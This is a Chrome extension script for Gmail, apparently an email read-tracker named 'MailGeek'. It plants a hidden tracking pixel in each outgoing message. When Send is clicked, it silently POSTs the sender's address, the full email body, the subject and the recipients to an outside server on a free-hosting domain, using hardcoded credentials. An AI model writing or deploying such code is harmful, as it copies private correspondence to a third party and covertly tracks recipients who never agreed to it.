var random=Math.floor(Math.random() * 1000000);
var filenamea="dot.png?abc="+random;
var email_id="";
var button_Active=true;

chrome.runtime.onMessage.addListener(function(response,sender,sendResponse)
{
	
	if(response=="true")
	{
		chrome.storage.sync.set({'response':1});
	}else if(response=="false")
	{
		chrome.storage.sync.set({'response':0});
		button_Active=false;
	}
});
 document.addEventListener("mouseover",function()
 	{
 		chrome.storage.sync.get('response',function(res){

 				if(parseInt(res.response)==1)button_Active=true;
 				else if(parseInt(res.response)==0)button_Active=false;
 			
 		});
 		if(button_Active==true){
 			myfunction();
 		}
	});
 function myfunction(){
 	var email_container=document.getElementsByClassName("gb_Ib");//for my email
	email_id=email_container[0].innerHTML;


var a=document.getElementsByClassName("Am Al editable LW-avf");
var val="";
 if(a[0]!=null){
var text=a[0].innerHTML;
 
  var body_block=document.getElementsByName("body");

var rec_id="";
var sub_id="";
var sub_id_block2=document.getElementsByClassName("aYF");
var rec_id_block=document.getElementsByName("to");

rec_id=((rec_id_block[0].value).match(/<.*>/));
if(rec_id != null){
	rec_id[0]=rec_id[0].replace('>', '');
	rec_id[0]=rec_id[0].replace('<', '');
}
else{
	rec_id=rec_id_block[0].value
}


if(rec_id_block[2]!=null)
{

	var rec_id_2=(rec_id_block[1].value).match(/<.*>/);
	if(rec_id_2 != null){
		rec_id_2[0]=rec_id_2[0].replace('>', '');
		rec_id_2[0]=rec_id_2[0].replace('<', '');
	}
	else{
		rec_id_2=rec_id_block[1].value
	}
	rec_id_2[0]=rec_id_2[0].replace('>', '');
	rec_id_2[0]=rec_id_2[0].replace('<', '');
	rec_id+=" , "+rec_id_2+" or other recipient";
}
sub_id=sub_id_block2[0].innerHTML;


var res = text.replace(/<img .*>/,'');
	if(/<img .*>/.test(text)){
	
	}
	else
	{
		  a[0].innerHTML='<img alt="MailGeek" src='+"https://geekagame.000webhostapp.com/images/"+filenamea+' style="display:none">'+text;
	
	}

var z=document.getElementsByClassName("J-J5-Ji btA");//class="T-I J-J5-Ji aoO T-I-atl L3 T-I-JW T-I-JO T-I-Je T-I-Zf-aw2"
var k=z[0].childNodes;

  k[1].onclick=function()
 {

	
	
		if(a.length>0){

		var formData = new FormData();
		formData.append("user_name", "abcx");
		formData.append("Pass_word", "123");
		formData.append("filename",random)
		formData.append("sender",email_id);
		formData.append("content_mail",res);
		formData.append("subject",sub_id);
		formData.append("recipients",rec_id);

		$.ajax({
       url: "https://geekagame.000webhostapp.com/index.php",
       type: "POST",
       data: formData,
       processData: false,
       contentType: false,
       success: function(response) {

       },
       error: function(jqXHR, textStatus, errorMessage) {
       }
    });

		random=Math.floor(Math.random() * 1000000);
		filenamea="dot.png?abc="+random;

	}

 }
}
}
